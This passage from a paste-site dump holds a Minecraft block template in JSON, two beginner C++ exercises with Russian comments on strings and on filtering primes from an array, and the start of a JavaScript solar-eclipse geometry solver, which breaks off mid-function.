  ""statePosArrayList"": ""{blockstatemap:[{Name:\""minecraft:air\""},{Name:\""twilightforest:twilight_oak_planks\""},{Name:\""minecraft:mangrove_log\"",Properties:{axis:\""y\""}},{Name:\""minecraft:mangrove_fence\"",Properties:{east:\""true\"",north:\""false\"",south:\""false\"",waterlogged:\""false\"",west:\""true\""}},{Name:\""minecraft:mangrove_fence\"",Properties:{east:\""true\"",north:\""false\"",south:\""true\"",waterlogged:\""false\"",west:\""false\""}},{Name:\""minecraft:mangrove_fence\"",Properties:{east:\""false\"",north:\""true\"",south:\""false\"",waterlogged:\""false\"",west:\""true\""}},{Name:\""minecraft:mangrove_fence\"",Properties:{east:\""true\"",north:\""true\"",south:\""false\"",waterlogged:\""false\"",west:\""false\""}},{Name:\""minecraft:mangrove_fence\"",Properties:{east:\""false\"",north:\""false\"",south:\""true\"",waterlogged:\""false\"",west:\""true\""}},{Name:\""minecraft:mangrove_planks\""},{Name:\""minecraft:mangrove_fence\"",Properties:{east:\""false\"",north:\""true\"",south:\""true\"",waterlogged:\""false\"",west:\""false\""}},{Name:\""minecraft:mangrove_trapdoor\"",Properties:{facing:\""west\"",half:\""top\"",open:\""false\"",powered:\""false\"",waterlogged:\""false\""}},{Name:\""minecraft:mangrove_trapdoor\"",Properties:{facing:\""east\"",half:\""top\"",open:\""false\"",powered:\""false\"",waterlogged:\""false\""}},{Name:\""minecraft:mangrove_trapdoor\"",Properties:{facing:\""south\"",half:\""top\"",open:\""false\"",powered:\""false\"",waterlogged:\""false\""}},{Name:\""minecraft:mangrove_trapdoor\"",Properties:{facing:\""north\"",half:\""top\"",open:\""false\"",powered:\""false\"",waterlogged:\""false\""}}],endpos:{X:18,Y:10,Z:0},startpos:{X:0,Y:0,Z:-18},statelist:[I;0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,1,1,1,1,1,2,0,0,0,0,0,0,0,0,0,0,0,0,2,3,3,3,3,3,2,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,1,1,1,0,0,1,0,0,1,1,1,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,4,5,0,0,0,0,0,6,7,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,1,1,1,0,1,0,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,8,8,1,1,1,8,8,1,1,1,0,0,0,0,0,0,4,3,5,0,0,0,0,0,0,0,6,3,7,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,1,1,1,0,0,0,0,0,0,0,1,1,1,0,0,0,0,0,0,0,0,1,1,1,0,1,0,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,8,8,8,8,1,1,1,8,8,8,8,1,0,0,0,0,0,0,9,0,0,0,0,0,0,0,0,0,0,0,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,1,1,1,0,1,0,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,0,0,0,0,0,0,0,0,0,1,1,8,8,8,8,1,1,1,8,8,8,8,1,1,0,0,0,0,4,5,0,0,0,0,0,0,0,0,0,0,0,6,7,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,1,1,10,1,11,1,1,0,0,0,0,0,0,0,2,1,8,8,8,8,8,1,1,1,8,8,8,8,8,1,2,0,0,2,5,0,0,0,0,0,0,0,0,0,0,0,0,0,6,2,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,1,12,10,1,11,10,1,1,0,0,0,0,0,0,1,1,8,8,8,8,8,1,1,1,8,8,8,8,8,1,1,0,0,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,1,1,12,12,10,1,11,10,10,1,1,0,0,0,0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,1,13,13,13,10,1,13,13,13,13,1,0,0,0,0,0,1,1,1,1,1,1,1,1,2,1,1,1,1,1,1,1,1,0,0,9,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,9,0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,1,1,0,1,1,0,0,0,0,0,0,2,0,0,0,0,0,0,1,1,0,0,0,1,1,0,0,0,0,0,2,0,0,0,0,0,1,1,0,0,0,0,0,1,1,0,0,0,0,2,0,0,0,0,1,1,0,0,0,0,0,0,0,1,1,1,1,1,1,1,1,1,1,1,0,0,0,0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,1,12,12,12,12,1,11,12,12,12,1,0,0,0,0,0,1,1,8,8,8,8,8,1,1,1,8,8,8,8,8,1,1,0,0,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,1,1,11,11,10,1,11,13,13,1,1,0,0,0,0,0,2,1,8,8,8,8,8,1,1,1,8,8,8,8,8,1,2,0,0,2,7,0,0,0,0,0,0,0,0,0,0,0,0,0,4,2,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,1,11,10,1,11,13,1,1,0,0,0,0,0,0,0,1,1,8,8,8,8,1,1,1,8,8,8,8,1,1,0,0,0,0,6,7,0,0,0,0,0,0,0,0,0,0,0,4,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,1,1,10,1,11,1,1,0,0,0,0,0,0,0,0,0,1,8,8,8,8,1,1,1,8,8,8,8,1,0,0,0,0,0,0,9,0,0,0,0,0,0,0,0,0,0,0,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,1,1,1,0,1,0,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,1,1,1,8,8,1,1,1,8,8,1,1,1,0,0,0,0,0,0,6,3,7,0,0,0,0,0,0,0,4,3,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,1,1,1,0,0,0,0,0,0,0,1,1,1,0,0,0,0,0,0,0,0,1,1,1,0,1,0,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,6,7,0,0,0,0,0,4,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,1,1,1,0,1,0,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,1,1,1,1,1,2,0,0,0,0,0,0,0,0,0,0,0,0,2,3,3,3,3,3,2,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,1,1,1,0,0,1,0,0,1,1,1,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]}"",
  ""requiredItems"": {
    ""twilightforest:twilight_oak_planks"": 457,
    ""minecraft:mangrove_trapdoor"": 40,
    ""minecraft:mangrove_planks"": 80,
    ""minecraft:mangrove_log"": 58,
    ""minecraft:mangrove_fence"": 56
  }
}"
f7r0e7aK,Untitled,35657,C++,Saturday 13th of April 2024 01:39:16 AM CDT,"#include <iostream> 

using namespace std;

int main() {
    setlocale(LC_ALL, ""ru"");

    srand(time(NULL));

    const int size = 5;

    char line[size]{ 'C', 'a', 't', '!', '\0'}; // строкой называется символьный массив с терминальным нулем в конце

    cout << line << endl; // выводит строку в консоль можно без цикла

    char new_line[] = ""Cat!""; // инициализировать строку можно через = (присваивание)

    cout << new_line << endl;

    char new_line2[40];

    cin >> new_line2; // считывать строку можно в заранне подготовленный массив без цикла

    cout << new_line2 << endl;
}"
0vaX18n1,Untitled,35657,C++,Saturday 13th of April 2024 01:05:07 AM CDT,"#include <iostream> 

using namespace std;

void print(int* arr, int size) {
    for (int i = 0; i < size; i++) {
        cout << arr[i] << "" "";
    }
    cout << endl;
}

void fill(int* arr, int size) {
    for (int i = 0; i < size; i++) {
        arr[i] = rand() % 10;
    }
}

bool is_simple(int number) {
    for (int i = 2; i <= number / 2; i++) {
        if (number % i == 0) {
            return false;
        }
    }
    return true;
}

void remove_simple(int*& arr, int& size) {
    int temp_size = size;

    int* temp = new int[temp_size];

    int count = 0;

    for (int i = 0; i < size; i++) {
        if (!is_simple(arr[i])) {
            temp[count++] = arr[i];
        }
    }

    delete[] arr;

    arr = new int[count];

    size = count;

    for (int i = 0; i < size; i++) {
        arr[i] = temp[i];
    }

    delete[] temp;
}

int main() {
    setlocale(LC_ALL, ""ru"");

    srand(time(NULL));

    int size;

    cout << ""Введите размер массива: "";
    cin >> size;

    int* arr = new int[size];

    fill(arr, size);
    print(arr, size);

    remove_simple(arr, size);

    print(arr, size);

    delete[] arr;
}"
RjfGbKL6,Eclipse solver,onlinebacon,JavaScript,Saturday 13th of April 2024 12:49:03 AM CDT,"// -------------------------------------------------------------------------- //
// BUILT IN MATH FUNCTIONS AND GENERAL TRIG FUNCTIONS ----------------------- //
// -------------------------------------------------------------------------- //

const { PI, abs, sqrt, sign, sin, cos, tan, asin, acos, atan } = Math;

const TAU = PI * 2;
const D90 = PI / 2;
const D30 = PI / 6;

const toRad = (deg) => deg / 180 * PI;
const toDeg = (rad) => rad / PI * 180;

const oneWayAngleDiff = (a, b) => {
	return a < b ? a + TAU - b : a - b;
};

// -------------------------------------------------------------------------- //
// CONSTANTS ---------------------------------------------------------------- //
// -------------------------------------------------------------------------- //

const SEC = 1000;
const MIN = SEC * 60;
const HOUR = MIN * 60;
const KM = 1;
const MILE = 1.609344 * KM;
const AU = 150e6 * KM;
const KMPH = KM / HOUR;
const MPH = MILE / HOUR;

const moonRadius = 1737.4 * KM;
const earthRadius = 6371 * KM;
const sunRadius = (1392700 / 2) * KM;

const overrideMoonDist = 359829 * KM;
const overrideSunDist = 149820729 * KM;

// -------------------------------------------------------------------------- //
// AUXILIAR FUNCTIONS ------------------------------------------------------- //
// -------------------------------------------------------------------------- //

const parseAngle = (string) => {
	const sepRegex = /^\s*[°'""]\s*|\s+/;
	const numRegex = /^\d+(\.\d+)?/;
	const unitMap = {
		'°': 1,
		""'"": 1 / 60,
		'""': 1 / 60 / 60,
	};
	string = string.trim();
	let sign = 1;
	if (string.startsWith('-')) {
		sign = -1;
		string = string.substring(1).trim();
	}
	let sum = 0;
	let unit = 1;
	while (string.length > 0) {
		const num = string.match(numRegex)?.[0];
		if (!num) {
			return NaN;
		}
		string = string.substring(num.length);
		const sep = string.match(sepRegex)?.[0];
		if (sep) {
			string = string.substring(sep.length);
			const short = sep.trim();
			if (short !== '') {
				unit = unitMap[short];
			}
		} else if (string !== '') {
			return NaN;
		}
		sum += num * unit;
		unit /= 60;
	}
	return toRad(sum * sign);
};

const round = (value, n = 0) => {
	return Number(value.toFixed(n));
};

const strAngle = (angle, pos = '', neg = '-') => {
	const tSec = round(toDeg(abs(angle)) * 3600, 1);
	const sec = round(tSec % 60, 1);
	const tMin = round((tSec - sec)/60);
	const min = round(tMin % 60);
	const deg = round((tMin - min)/60);
	const sign = angle < 0 ? neg : pos;
	return `${sign}${deg}°${min}'${sec}"" / ${round(toDeg(angle), 6).toString()}°`;
};

const numberWithNDigits = (num, n, suffix = '') => {
	if (abs(num) >= (10 ** n)) {
		return Math.round(num).toString() + suffix;
	}
	return Number(num.toPrecision(n)) + suffix;
};

const strDist = (dist, n = 5) => {
	const km = numberWithNDigits(dist/KM, n, ' km');
	const mi = numberWithNDigits(dist/MILE, n, ' mi');
	return  `${km} / ${mi}`;
};

const strSpeed = (speed, n = 5) => {
	const kmph = numberWithNDigits(speed / KMPH, n, ' km/h');
	const mph = numberWithNDigits(speed / MPH, n, ' mph');
	return `${kmph} / ${mph}`;
};

const strTime = (timestamp) => {
	const date = new Date(timestamp).toISOString();
	return date.replace(/^.*T/, '').replace('Z', ' (UTC)');
};

const strDuration = (duration) => {
	const tSec = round(duration / SEC);
	const sec = tSec % 60;
	const tMin = (tSec - sec)/60;
	const min = tMin % 60;
	const hrs = (tMin - min)/60;
	const strSec = sec.toString().padStart(2, '0');
	const strMin = min.toString().padStart(2, '0');
	const strHrs = hrs.toString().padStart(2, '0');
	return `${strHrs}h${strMin}m${strSec}s`;
};

// -------------------------------------------------------------------------- //
// DATA PARSING ------------------------------------------------------------- //
// -------------------------------------------------------------------------- //

const table = [];

const addAlmanacData = (text) => {
	let date = null;
	const lines = text.trim().split(/\n/);
	for (let line of lines) {
		line = line.trim();
		if (line.startsWith('#')) {
			continue;
		}
		if (/^date:/i.test(line)) {
			const strDate = line.replace(/^date:/i, '').trim();
			const isoDate = strDate + 'T00:00:00Z';
			date = new Date(isoDate).getTime();
			continue;
		}
		const [ hour, ...angles ] = line.trim().split(/\s*\|\s*/);
		const time = date + hour * HOUR;
		const [ sunGHA, sunDec, moonGHA, moonDec, moonHP ] = angles.map(parseAngle);
		const obj = { time, sunGHA, sunDec, moonGHA, moonDec, moonHP };
		table.push(obj);
	}
};

const interpolate = (time, field) => {
	for (let i=1; i<table.length; i++) {
		const bef = table[i - 1];
		if (time < bef.time) {
			continue;
		}
		const aft = table[i];
		if (time > aft.time) {
			continue;
		}
		const t = (time - bef.time) / (aft.time - bef.time);
		const a = bef[field];
		const b = aft[field];
		return a + (b - a) * t;
	}
	throw new Error(`time ${new Date(time).toISOString()} is out of bounds`);
};

// -------------------------------------------------------------------------- //
// VECTOR OPERATIONS (LINEAR ALGEBRA) --------------------------------------- //
// -------------------------------------------------------------------------- //

const subVec = ([ ax, ay, az ], [ bx, by, bz ]) => {
	return [ ax - bx, ay - by, az - bz ];
};

const sumVec = ([ ax, ay, az ], [ bx, by, bz ]) => {
	return [ ax + bx, ay + by, az + bz ];
};

const normalizeVec = ([ x, y, z ]) => {
	const len = sqrt(x*x + y*y + z*z);
	return [ x/len, y/len, z/len ];
};

const dotProd = (a, b) => {
	const [ ax, ay, az ] = a;
	const [ bx, by, bz ] = b;
	return (ax * bx) + (ay * by) + (az * bz);
};

const scaleVec = (vec, val) => {
	const [ x, y, z ] = vec;
	return [ x*val, y*val, z*val ];
};

const vecLen = ([ x, y, z ]) => {
	return sqrt(x*x + y*y + z*z);
};

const rotVecY = ([ x, y, z ], angle) => {
	const s = sin(angle);
	const c = cos(angle);
	return [ x*c - z*s, y, z*c + x*s ];
};

const rotVecX = ([ x, y, z ], angle) => {
	const s = sin(angle);
	const c = cos(angle);
	return [ x, y*c + z*s, z*c - y*s ];
};

const rotVecZ = ([ x, y, z ], angle) => {
	const s = sin(angle);
	const c = cos(angle);
	return [ x*c + y*s, y*c - x*s, z ];
};

const vecIsValid = ([ x, y, z ]) => {
	return !(isNaN(x) || isNaN(y) || isNaN(z));
};

// -------------------------------------------------------------------------- //
// LAT/LONG MATH ------------------------------------------------------------ //
// -------------------------------------------------------------------------- //

// Geocentric
const GC = {
	vecToGP: (vec) => {
		const [ x, y, z ] = normalizeVec(vec);
		const lat = asin(z);
		const len = sqrt(x*x + y*y);
		const lon = len === 0 ? 0 : acos(x/len) * (y < 0 ? -1 : 1);
		return [ lat, lon ];
	},
	gpToUnitVec: (gp) => {
		const [ lat, lon ] = gp;
		const x = + cos(lat) * cos(lon);
		const y = + cos(lat) * sin(lon);
		const z = + sin(lat);
		return [ x, y, z ];
	},
	gpDistToVec: (gp, dist) => {
		const vec = GC.gpToUnitVec(gp);
		return scaleVec(vec, dist);
	},
	calcAngle: (gp1, gp2) => {
		const aVec = GC.gpToUnitVec(gp1);
		const bVec = GC.gpToUnitVec(gp2);
		return acos(dotProd(aVec, bVec));
	},
	calcDistance: (gp1, gp2) => {
		return GC.calcAngle(gp1, gp2) * earthRadius;
	},
	calcAzimuth: (gp1, gp2) => {
		const [ lat1, lon1 ] = gp1;
		const [ lat2, lon2 ] = gp2;
		const dlon = lon2 - lon1;
		const x = cos(lat2) * cos(dlon);
		const y = cos(lat2) * sin(dlon);
		const z = sin(lat2);
		const newZ = z*cos(lat1) - x*sin(lat1);
		const east = acos(newZ/sqrt(newZ ** 2 + y ** 2));
		return y >= 0 ? east : TAU - east;
	},
};

// -------------------------------------------------------------------------- //
// ECLIPSE MATH ------------------------------------------------------------- //
// -------------------------------------------------------------------------- //

const ghaToLon = (gha) => {
	return (TAU*1.5 - gha) % TAU - PI;
};

const getMoonGhaDec = (time) => {
	const gha = interpolate(time, 'moonGHA');
	const dec = interpolate(time, 'moonDec');
	return [ gha, dec ];
};

const getSunGhaDec = (time) => {
	const gha = interpolate(time, 'sunGHA');
	const dec = interpolate(time, 'sunDec');
	return [ gha, dec ];
};

const hpToDist = (hp) => {
	const dist = earthRadius / tan(hp);
	return dist;
};

const findGHAMeridianMatch = () => {
	for (let i=1; i<table.length; ++i) {
		const bef = table[i - 1];
		const aft = table[i];
		const sunApproaching = oneWayAngleDiff(bef.moonGHA, bef.sunGHA) < D30;
		const sunPasses = oneWayAngleDiff(aft.sunGHA, aft.moonGHA) < D30;
		if (!sunApproaching || !sunPasses) {
			continue;
		}
		const dt = aft.time - bef.time;
		const dSun = aft.sunGHA - bef.sunGHA;
		const dMoon = aft.moonGHA - bef.moonGHA;
		const t = (bef.moonGHA - bef.sunGHA) / (dSun - dMoon);
		const time = bef.time + dt * t;
		return time;
	}
	return null;
};

const ghaDecDistToVec = (gha, dec, dist) => {
	const gp = [ dec, ghaToLon(gha) ];
	return GC.gpDistToVec(gp, dist);
};

const getMoonDist = (time) => {
	return overrideMoonDist ?? hpToDist(interpolate(time, 'moonHP'));
};

const getMoonVec = (time) => {
	const [ gha, dec ] = getMoonGhaDec(time);
	const dist = getMoonDist(time);
	return ghaDecDistToVec(gha, dec, dist);
};

const getSunDist = (time) => {
	return overrideSunDist ?? AU;
};

const getSunVec = (time) => {
	const [ gha, dec ] = getSunGhaDec(time);
	const dist = getSunDist(time);
	return ghaDecDistToVec(gha, dec, dist);
};

const getCenterShadowRay = (moonVec, sunVec) => {
	const dir = normalizeVec(subVec(moonVec, sunVec));
	const origin = moonVec;
	return { origin, dir };
};

const rayEarthIntersection = ({ origin, dir }) => {
	const midT = dotProd(subVec([ 0, 0, 0 ], origin), dir);
	if (midT < 0) {
		return [ NaN, NaN, NaN ];
	}
	const midVec = sumVec(origin, scaleVec(dir, midT));
	const centerDist = vecLen(midVec);
	if (centerDist > earthRadius) {
		return [ NaN, NaN, NaN ];
	}
	const tDiff = sqrt(earthRadius**2 - centerDist**2);
	const t = midT - tDiff;
	return sumVec(origin, scaleVec(dir, t));
};

const calcUmbraAngle = (moonSunDist) => {
	return asin((sunRadius - moonRadius)/moonSunDist);
};

const calcPenumbraAngle = (moonSunDist) => {
	return - asin((sunRadius + moonRadius)/moonSunDist);
};

const buildShadowEdgeRay = (moonVec, sunVec, azimuth, calcAngle) => {
	const moonSunDist = vecLen(subVec(moonVec, sunVec));
	const angle = calcAngle(moonSunDist);
	
	let origin = [ 0, 0, moonRadius ];
	let dir = [ -1, 0, 0 ];

	origin = rotVecY(origin, angle);
	dir = rotVecY(dir, angle)

	origin = rotVecX(origin, azimuth);
